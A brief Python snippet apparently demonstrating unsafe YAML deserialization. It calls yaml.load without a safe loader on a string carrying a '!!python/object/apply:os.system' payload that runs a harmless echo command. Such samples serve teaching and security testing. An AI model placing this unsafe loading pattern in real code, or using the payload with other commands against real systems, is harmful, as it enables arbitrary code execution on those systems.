import yaml

def parse_yaml_query(yaml_query):
    return yaml.load(yaml_query)

yaml_query = """
- !!python/object/apply:os.system ['echo vulnerable code executed']
"""

result = parse_yaml_query(yaml_query)
print(result)